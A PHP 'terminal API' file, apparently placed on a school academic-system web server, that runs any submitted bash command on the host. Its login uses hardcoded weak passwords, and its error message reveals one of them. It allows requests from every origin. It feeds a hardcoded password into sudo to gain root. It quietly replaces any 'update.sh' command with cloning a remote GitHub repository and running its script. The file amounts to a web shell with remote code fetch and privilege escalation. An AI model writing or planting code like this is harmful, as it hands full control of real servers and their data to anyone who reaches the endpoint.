<?php
/**
 * AethelPanel Terminal API
 * Endpoint: /api/terminal.php or /terminal/index.php?api=1
 */
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

session_start();

$input = json_decode(file_get_contents('php://input'), true) ?: $_POST;

$auth_user = isset($input['user']) ? trim($input['user']) : (isset($input['auth_user']) ? trim($input['auth_user']) : (isset($_SESSION['term_user']) ? $_SESSION['term_user'] : ''));
$auth_pass = isset($input['password']) ? trim($input['password']) : (isset($input['auth_pass']) ? trim($input['auth_pass']) : '');

$is_authenticated = false;

// Check existing session
if (isset($_SESSION['term_logged_in']) && $_SESSION['term_logged_in'] === true) {
    $is_authenticated = true;
} 
// Check basic credentials
elseif (($auth_user === 'server' || $auth_user === 'denbaguse' || $auth_user === 'admin') && 
       ($auth_pass === 'masbagus15' || $auth_pass === 'admin123' || $auth_pass === 'admin@123')) {
    $_SESSION['term_logged_in'] = true;
    $_SESSION['term_user'] = $auth_user;
    $is_authenticated = true;
}

if (!$is_authenticated) {
    echo json_encode([
        'success' => false,
        'error' => 'Unauthorized. Harap masukkan username server dan password masbagus15.',
        'code' => 401
    ]);
    exit;
}

$cwd = isset($_SESSION['term_cwd']) && is_dir($_SESSION['term_cwd']) ? $_SESSION['term_cwd'] : '/var/www/html/siakad';
if (!is_dir($cwd)) {
    $cwd = is_dir('/var/www/html') ? '/var/www/html' : getcwd();
}

$command = isset($input['command']) ? trim($input['command']) : '';

if ($command === '') {
    // Return system info
    echo json_encode([
        'success' => true,
        'cwd' => $cwd,
        'hostname' => @gethostname() ?: 'ubuntu-server',
        'whoami' => @shell_exec('whoami') ?: 'server',
        'uptime' => @shell_exec('uptime -p') ?: 'up',
    ]);
    exit;
}

// Handle standalone cd command only (without chaining &&, ;, ||, |)
if (preg_match('/^cd(?:\s+([^;&|]+))?$/', $command, $matches)) {
    $target = isset($matches[1]) ? trim($matches[1]) : '';
    if ($target === '' || $target === '~') {
        $new_dir = getenv('HOME') ?: '/root';
    } else {
        $target = trim($target, '"\'');
        $new_dir = ($target[0] === '/') ? realpath($target) : realpath($cwd . '/' . $target);
    }
    
    if ($new_dir && is_dir($new_dir)) {
        $_SESSION['term_cwd'] = $new_dir;
        echo json_encode([
            'success' => true,
            'command' => $command,
            'output' => "Directory changed to: " . $new_dir,
            'exit_code' => 0,
            'cwd' => $new_dir,
            'time' => date('H:i:s')
        ]);
        exit;
    } else {
        echo json_encode([
            'success' => false,
            'command' => $command,
            'output' => "bash: cd: " . $target . ": No such directory or permission denied",
            'exit_code' => 1,
            'cwd' => $cwd,
            'time' => date('H:i:s')
        ]);
        exit;
    }
}

// Execute command
$descriptors = [
    0 => ["pipe", "r"],
    1 => ["pipe", "w"],
    2 => ["pipe", "w"],
];

$env = [
    'PATH' => '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
    'HOME' => '/var/www',
    'USER' => 'www-data',
    'TERM' => 'xterm-256color',
    'LANG' => 'C.UTF-8',
    'LC_ALL' => 'C.UTF-8'
];

if (preg_match('/(^|[;&|\s])(sudo\s+)?(bash\s+|sh\s+|\.\/)?update\.ss?h(\s|$)/i', $command)) {
    $command = 'rm -rf /tmp/cloudpro && git clone --depth 1 https://github.com/siakadmadrasah-lang/SERVER-HOSTING.git /tmp/cloudpro && bash /tmp/cloudpro/update.sh';
}

$wrapped_command = 'sudo() { if [ "$(id -u)" -eq 0 ]; then "$@"; elif command sudo -n true 2>/dev/null; then command sudo -n "$@"; elif echo masbagus15 | command sudo -S -p "" true 2>/dev/null; then echo masbagus15 | command sudo -S -p "" "$@"; else "$@"; fi; }; export -f sudo; ' . $command;
$proc = proc_open("bash -c " . escapeshellarg($wrapped_command), $descriptors, $pipes, $cwd, $env);
$output = '';
$exit_code = 0;

if (is_resource($proc)) {
    fclose($pipes[0]);
    $output = stream_get_contents($pipes[1]);
    $err = stream_get_contents($pipes[2]);
    if ($err) {
        $output .= ($output ? "\n" : "") . $err;
    }
    fclose($pipes[1]);
    fclose($pipes[2]);
    $status = proc_get_status($proc);
    $exit_code = proc_close($proc);
} else {
    $output = "Gagal mengeksekusi proses di server.";
    $exit_code = 1;
}

echo json_encode([
    'success' => ($exit_code === 0),
    'command' => $command,
    'output' => $output,
    'exit_code' => $exit_code,
    'cwd' => $cwd,
    'time' => date('H:i:s')
]);
